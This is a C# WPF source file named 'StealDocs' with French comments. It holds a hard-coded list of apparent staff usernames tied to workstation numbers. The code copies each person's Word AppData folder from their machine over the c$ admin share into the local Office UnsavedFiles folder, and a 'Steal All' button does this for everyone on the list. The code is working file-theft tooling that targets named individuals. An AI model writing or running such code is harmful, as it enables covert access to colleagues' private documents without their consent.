using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace StealDocs
{
    /// <summary>
    /// Logique d'interaction pour MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public string strBasePath;
        public string strUsername;
        public string strNumeroPoste;
        public string strWord;
        public string sourceDirectory;
        public string targetDirectory;

        //Ce Dictionnary va contenir la liste des gens et de leur numéro de poste.
        public Dictionary<string, string> maListe = new Dictionary<string, string>();



        public MainWindow()
        {
            InitializeComponent();

            // Ajout des éléments au dictionnary
            maListe.Add("1", "schedert");
            maListe.Add("2", "gontrana");
            maListe.Add("4", "zimmermannr");
            maListe.Add("5", "benderm");
            maListe.Add("6", "kaufmanndw");
            maListe.Add("7", "onganm");
            maListe.Add("8", "rodriguesD");

            //On met les valeurs dans la comboBox
            comboBoxUser.ItemsSource = maListe;

        }

        /// <summary>




        private void Button_Click(object sender, RoutedEventArgs e)
        {




            setUserPathAndNumerPoste();
            strBasePath = @"\\LMB-212-0";
            strWord = @"\AppData\Roaming\Microsoft\Word\";
            sourceDirectory = strBasePath+ strNumeroPoste + @"\c$\Users\" + strUsername + strWord;

            //Dossier dans le quel déposer les fichiers récupérés
            targetDirectory = getDestinationFolder();


            Copy(sourceDirectory, targetDirectory);
        }

        public static void Copy(string sourceDirectory, string targetDirectory)
        {
            var diSource = new DirectoryInfo(sourceDirectory);
            var diTarget = new DirectoryInfo(targetDirectory);

            CopyAll(diSource, diTarget);
        }

        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
        {
            Directory.CreateDirectory(target.FullName);

            // Copy each file into the new directory.
            foreach (FileInfo fi in source.GetFiles())
            {
                Console.WriteLine(@"Copying {0}\{1}", target.FullName, fi.Name);
                fi.CopyTo(System.IO.Path.Combine(target.FullName, fi.Name), true);
            }

            // Copy each subdirectory using recursion.
            foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
            {
                DirectoryInfo nextTargetSubDir =
                    target.CreateSubdirectory(diSourceSubDir.Name);
                CopyAll(diSourceSubDir, nextTargetSubDir);
            }
        }

        public void setUserPathAndNumerPoste()
        {
            //reucpere le text affiché
            String UserPath = comboBoxUser.Text;
            //recupère la clé, qui correspond a son numero de poste
            String NumeroPoste = comboBoxUser.SelectedValue.ToString();




            strUsername = UserPath;
            strNumeroPoste = NumeroPoste;
        }

        private void btnOpenDestinationFolder_Click(object sender, RoutedEventArgs e)
        {
            Process.Start(getDestinationFolder());
        }

        private string getDestinationFolder()
        {
            string userName = Environment.UserName;
            string chemin1 = @"C:/Users/";
            string chemin2 = @"/AppData/Local/Microsoft/Office/UnsavedFiles";
            string cheminFinal = chemin1 + userName + chemin2;

            return cheminFinal;
        }

        private void btnStealAll_Click(object sender, RoutedEventArgs e)
        {
            
            foreach (KeyValuePair<string, string> entry in maListe)
            {
                // do something with entry.Value or entry.Key
                String strTempNumeroPoste = entry.Key;
                String strTempUserName = entry.Value;

                strBasePath = @"\\LMB-212-0";
                strWord = @"\AppData\Roaming\Microsoft\Word\";
                sourceDirectory = strBasePath + strTempNumeroPoste + @"\c$\Users\" + strTempUserName + strWord;

                var diSource = new DirectoryInfo(sourceDirectory);
                var diTarget = new DirectoryInfo(targetDirectory);

                CopyAll(diSource, diTarget);
            }

        }
    }
}
